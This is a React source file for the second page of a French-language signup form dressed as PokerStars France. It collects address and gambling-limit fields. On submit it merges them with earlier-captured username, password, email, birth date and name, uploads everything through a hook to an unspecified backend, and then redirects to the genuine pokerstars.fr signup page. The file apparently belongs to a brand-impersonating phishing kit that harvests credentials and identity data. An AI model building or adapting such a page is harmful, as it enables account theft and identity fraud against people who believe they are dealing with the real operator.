import React, { useState } from "react";
import { MdNavigateNext } from "react-icons/md";
import { GrFormPrevious } from "react-icons/gr";
import { useNext } from "./useNext";
import { usePrevious } from "./usePrevios";
import { useSaveMultipleData } from "./useSaveData";
import { useUpload } from "./useUpload";
import { Spinner } from "react-bootstrap";
import Svg from "./svg";
import { useRecoilValue } from "recoil";
import { PokerStarsData } from "@/app/atoms/pokerStarsData";
import { countries } from "./countries";
import { weeklyLimits } from "../weeklyLimits";
import Circle from "./circle";
import Divider from "./divder";
import { useValidate } from "./useValidation";
const boldStyle = { fontWeight: "bold", color: "#05D6AE" };
export const autoWithDrawLimits = [
  "",
  "10 €",
  "20 €",
  "50 €",
  "100 €",
  "250 €",
  "500 €",
  "1,000 €",
  "5,000 €",
  "10,000 €",
];
const bgcolor = { backgroundColor: "red" };
const inputStyle = {
  backgroundColor: "transparent",
  borderTop: "0",
  borderBottom: "1px solid silver",
  borderRight: "0",
  borderLeft: "0",
  borderRadius: "0px",
  color: "white",
  outline: "none",
};
export const Form2 = () => {
  const [state, setState] = useState("");
  const [city, setCity] = useState("");
  const [postcode, setPostCode] = useState("");
  const [sevendaylimit, setSevenDayLimit] = useState("");
  const [sevendayMinimumLimit, setSevendayMinimumLimit] = useState("");
  const [address, setAddress] = useState("");
  const [sevendayMaxmimumLimit, setSevendayMaxmimumLimit] = useState("");
  const [autoMaticWithdrawalLimit, setAutoMaticWithdrawalLimit] = useState("");
  const [loading, setLoading] = useState(false);
  const pokerStarsData = useRecoilValue(PokerStarsData);
  const upload = useUpload();
  const prev = usePrevious();
  const saveData = useSaveMultipleData();
  const validate = useValidate();
  const [error, setError] = useState({
    stateError: "",
    cityError: "",
    codePostalError: "",
  });

  const handleStateChange = (e) => {
    const res = validate("name", e.target.value);
    if (!res.response) {
      setError((prevError) => ({
        ...prevError,
        stateError: res.error,
      }));
    } else {
      setError((prevError) => ({
        ...prevError,
        stateError: "",
      }));
      setState(e.target.value);
    }
  };
  const handleCityChange = (e) => {
    const res = validate("name", e.target.value);
    if (!res.response) {
      setError((prevError) => ({
        ...prevError,
        cityError: res.error,
      }));
    } else {
      setError((prevError) => ({
        ...prevError,
        cityError: "",
      }));
      setCity(e.target.value);
    }
  };
  const handleCodePostalChange = (e) => {
    const res = validate("name", e.target.value);
    if (!res.response) {
      setError((prevError) => ({
        ...prevError,
        codePostalError: res.error,
      }));
    } else {
      setError((prevError) => ({
        ...prevError,
        codePostalError: "",
      }));
      setPostCode(e.target.value);
    }
  };

  const handlePrev = () => {
    prev();
  };
  const handleUpload = (d) => {
    return upload(d);
  };
  const handleNext = async (e) => {
    console.log("handlenext");
    e.preventDefault();
    setLoading(true);
    const dataOb = {
      countryf1: pokerStarsData.countryf1,
      username: pokerStarsData.username,
      password: pokerStarsData.password,
      email: pokerStarsData.email,
      dob: pokerStarsData.dob,
      countryofbirth: pokerStarsData.countryofbirth,
      stateofbirth: pokerStarsData.stateofbirth,
      cityofbirth: pokerStarsData.cityofbirth,
      address: address,
      state: state,
      city: city,
      postcode: postcode,
      firstname: pokerStarsData.firstname,
      lastname: pokerStarsData.lastname,
      gender: pokerStarsData.gender,
      sevenlimit: sevendaylimit.toString(),
      weeklylimit: sevendayMinimumLimit.toString(),
      depositlimit: sevendayMaxmimumLimit.toString(),
      autowithlimit: autoMaticWithdrawalLimit.toString(),
    };

    console.log("upload data");
    // Upload data
    const uploadSuccess = await handleUpload(dataOb);
    if (uploadSuccess) {
      console.log("Data uploaded successfully");
      window.location.href =
        "https://www.pokerstars.fr/signup?brand=4&redirectTo=/sports";
    } else {
      console.error("Data upload failed");
    }
  };
  return (
    <>
      <div style={{ backgroundColor: "   #1c1c1c" }}>
        <nav className="navbar navbar-expand-lg navbar-dark ms-4 py-4">
          <Svg />
        </nav>
      </div>

      <div className="container-fluid">
        <div className="row">
          <div className="col-md-4 left-column d-flex flex-column ">
            <picture>
              <img
                src="/pokerimages/poker-form-image.jpg"
                className="w-100 ms- mt-md-5 img-left ms-md-1 ms-lg-2 "
                alt="Placeholder"
              />
            </picture>
          </div>

          <div
            className="col-md-8 right-column "
            style={{ backgroundColor: "black", color: "white" }}
          >
            <div className="row justify-content-center justify-content-md-center">
              <div className="col-10 col-md-12 col-lg-10">
                <div
                  className="col-12 col-md-12 col-lg-12 pb-4"
                  style={{ paddingTop: "50px" }}
                >
                  {/* Title  */}
                  <div className="row">
                    <div className="col-12 col-md-8 col-lg-7">
                      <div
                        style={{
                          backgroundColor: "black",
                          color: "white",
                          fontWeight: "bolder",
                        }}
                        className=" text-start mb-2"
                      >
                        <h3 className="" style={{ fontWeight: "900" }}>
                          Informations de compte
                        </h3>
                      </div>
                    </div>

                    <div className="col-12 col-md-5 col-lg-5">
                      <div
                        className="justify-content-start"
                        style={{
                          display: "flex",
                          justifyContent: "center",
                          alignItems: "center",
                        }}
                      >
                        <Circle number={1} checked={true} />
                        <Divider />
                        <Circle number={2} checked={false} />
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div
                className="col-lg-10 col-md-10 col-sm-10"
                id="secondary-div-center"
              >
                <form onSubmit={handleNext}>
                  <h5
                    style={{
                      fontSize: "25px",
                      fontWeight: "bolder",
                      background: "linear-gradient(to right, #D70022, #190A05)",
                      WebkitBackgroundClip: "text",
                      WebkitTextFillColor: "transparent",
                    }}
                    className="text-center text-md-start mb-4"
                  >
                    Où habitez-vous donc,?
                  </h5>

                  <div className="row justify-content-center justify-content-md-start">
                    <div className="col-10 col-md-6 mb-3">
                      <label style={boldStyle} htmlFor="last-name">
                        Pays
                      </label>
                      <select
                        className="form-select form-input-border"
                        required
                        style={inputStyle}
                      >
                        {countries.map((country, index) => (
                          <option key={index}>{country}</option>
                        ))}
                      </select>
                    </div>

                    <div className="col-10 col-md-6">
                      <label style={boldStyle} htmlFor="email">
                        Adresse
                      </label>
                      <input
                        onChange={(e) => {
                          setAddress(e.target.value);
                        }}
                        type="text"
                        className="form-control"
                        id="text"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                    </div>

                    <div className="col-10 col-md-6">
                      <label style={boldStyle} htmlFor="email">
                        Département
                      </label>
                      <input
                        onChange={handleStateChange}
                        type="text"
                        className="form-control"
                        id="text"
                        placeholder=""
                        required
                        style={inputStyle}
                      />

                      {error.stateError && (
                        <span
                          style={{
                            color: "red",
                            fontSize: "14px",
                            fontFamily: "Roboto",
                          }}
                        >
                          {error.stateError}
                        </span>
                      )}
                    </div>

                    <div className="col-10 col-md-6">
                      <label style={boldStyle} htmlFor="time">
                        Ville
                      </label>
                      <input
                        onChange={handleCityChange}
                        type="text"
                        className="form-control"
                        id="time"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                      {error.cityError && (
                        <span
                          style={{
                            color: "red",
                            fontSize: "14px",
                            fontFamily: "Roboto",
                          }}
                        >
                          {error.cityError}
                        </span>
                      )}
                    </div>

                    <div className="col-10 col-md-6">
                      <label style={boldStyle} htmlFor="email">
                        Code postal
                      </label>
                      <input
                        onChange={handleCodePostalChange}
                        type="text"
                        className="form-control"
                        id="text"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                      {error.codePostalError && (
                        <span
                          style={{
                            color: "red",
                            fontSize: "14px",
                            fontFamily: "Roboto",
                          }}
                        >
                          {error.codePostalError}
                        </span>
                      )}
                    </div>
                  </div>

                  <div className="form-group mb-4">
                    <div className="mt-5">
                      <h5
                        style={{
                          fontSize: "25px",
                          fontWeight: "bolder",
                          background:
                            "linear-gradient(to right, #D70022, #190A05)",
                          WebkitBackgroundClip: "text",
                          WebkitTextFillColor: "transparent",
                        }}
                        className="text-center text-md-start mb-4"
                      >
                        Limite de dépôt{" "}
                      </h5>
                      <div className="row justify-content-center justify-content-md-start">
                        <div className="col-10 col-md-6">
                          <label style={boldStyle} htmlFor="last-name">
                            Limite de 7 jours
                          </label>
                          <input
                            onChange={(e) => {
                              setSevenDayLimit(e.target.value.toString());
                            }}
                            type="number"
                            className="form-control"
                            id="last-name"
                            placeholder=""
                            required
                            style={inputStyle}
                          />
                        </div>
                      </div>
                    </div>

                    <div className="mt-5">
                      <h5
                        style={{
                          fontSize: "25px",
                          fontWeight: "bolder",
                          background:
                            "linear-gradient(to right, #D70022, #190A05)",
                          WebkitBackgroundClip: "text",
                          WebkitTextFillColor: "transparent",
                        }}
                        className="text-center text-md-start mb-4"
                      >
                        Limite cumulée
                      </h5>
                      <div className="row justify-content-center justify-content-md-start">
                        <div className="col-10 col-md-6 mb-4">
                          <label style={boldStyle} htmlFor="last-name">
                            Limite de mise sur sept jours au poker
                          </label>
                          <select
                            onChange={(e) => {
                              setSevendayMinimumLimit(e.target.value);
                            }}
                            className="form-select form-input-border"
                            required
                            style={inputStyle}
                          >
                            <option></option>
                            {weeklyLimits.map((limit, index) => (
                              <option key={index}>{limit}</option>
                            ))}
                          </select>
                        </div>
                        <div className="col-10 col-md-6">
                          <label style={boldStyle} htmlFor="last-name">
                            Limite de mises sur sept jours aux paris
                          </label>
                          <select
                            onChange={(e) => {
                              setSevendayMaxmimumLimit(e.target.value);
                            }}
                            className="form-select form-input-border"
                            required
                            style={inputStyle}
                          >
                            <option></option>
                            {weeklyLimits.map((limit, index) => (
                              <option key={index}>{limit}</option>
                            ))}
                          </select>
                        </div>
                      </div>
                    </div>

                    <div className="mt-5">
                      <h5
                        style={{
                          fontSize: "25px",
                          fontWeight: "bolder",
                          background:
                            "linear-gradient(to right, #D70022, #190A05)",
                          WebkitBackgroundClip: "text",
                          WebkitTextFillColor: "transparent",
                        }}
                        className="text-center text-md-start"
                      >
                        Fixer la limite de retrait automatique
                      </h5>
                      <div className="row justify-content-center justify-content-md-start">
                        <div className="col-10 col-md-6">
                          <label style={boldStyle} htmlFor="last-name"></label>
                          <select
                            onChange={(e) => {
                              setAutoMaticWithdrawalLimit(e.target.value);
                            }}
                            className="form-select form-input-border"
                            required
                            style={inputStyle}
                          >
                            {autoWithDrawLimits.map((limit, index) => (
                              <option key={index} value={limit}>
                                {limit}
                              </option>
                            ))}
                          </select>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="row justify-content-center py-5">
                    <div className="col-10 col-md-12 d-flex justify-content-between flex-wrap">
                      {/* <button
                    className="btn mb-3 mb-md-0"
                    onClick={handlePrev}
                    style={{
                      borderRadius: "18px",
                      width: "100%",
                      maxWidth: "186px",
                      color: "white",
                      fontWeight: "700",
                      backgroundColor: "#000000",
                    }}
                  >
                    <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
                    Précédent
                  </button>
                  <button
                    className="btn"
                    type="submit"
                    onClick={handleNext}
                    style={{
                      borderRadius: "18px",
                      width: "100%",
                      maxWidth: "186px",
                      color: "white",
                      fontWeight: "700",
                      backgroundColor: "#190A05",
                      background:
                        "-webkit-linear-gradient(to bottom, #870000, #190a05)",
                      background:
                        "linear-gradient(to bottom, #FF0000, #190a05)",
                    }}
                  >
                    {loading && (
                      <Spinner animation="border" variant="light" />
                    )}
                    {!loading && (
                      <>
                        Continuer{" "}
                        <MdNavigateNext style={{ fontSize: "25px" }} />
                      </>
                    )}
                  </button> */}
                      <div className="button-box">
                        <button
                          className="btn custom-btn py-2 px-4 position-relative"
                          onClick={handlePrev}
                          style={{ borderRadius: "50px" }}
                        >
                          <span>
                            {" "}
                            <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
                            Précédent{" "}
                          </span>
                        </button>
                        <style jsx>{`
                          .custom-btn {
                            color: #05d6ae;
                            border: 2px solid #05d6ae;
                            text-transform: uppercase;
                            overflow: hidden;
                            transition: color 400ms;
                          }

                          .custom-btn::before {
                            content: "";
                            position: absolute;
                            border-radius: 50%;
                            top: 0;
                            left: 0;
                            right: 0;
                            bottom: 0;
                            background: #05d6ae;
                            z-index: -1;
                            transition: transform 400ms ease-out;
                            transform: scaleX(0);
                            transform-origin: left;
                          }

                          .custom-btn:hover::before {
                            transform: scaleX(1);
                          }

                          .custom-btn:hover {
                            color: #ffffff;
                          }
                        `}</style>
                      </div>
                      <div className="button-box">
                        <button
                          className="btn custom-btn py-2 px-4 position-relative"
                          style={{ borderRadius: "50px" }}
                          type="submit"
                        >
                          <span>
                            {loading && (
                              <Spinner animation="border" variant="light" />
                            )}
                            {!loading && (
                              <>
                                Continuer{" "}
                                <MdNavigateNext style={{ fontSize: "25px" }} />
                              </>
                            )}
                          </span>
                        </button>

                        <style jsx>{`
                          .custom-btn {
                            color: #05d6ae;
                            border: 2px solid #05d6ae;
                            text-transform: uppercase;
                            overflow: hidden;
                            transition: color 400ms;
                          }

                          .custom-btn::before {
                            content: "";
                            position: absolute;
                            border-radius: 50%;
                            top: 0;
                            left: 0;
                            right: 0;
                            bottom: 0;
                            background: #05d6ae;
                            z-index: -1;
                            transition: transform 400ms ease-out;
                            transform: scaleX(0);
                            transform-origin: left;
                          }

                          .custom-btn:hover::before {
                            transform: scaleX(1);
                          }

                          .custom-btn:hover {
                            color: #ffffff;
                          }
                        `}</style>
                      </div>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};
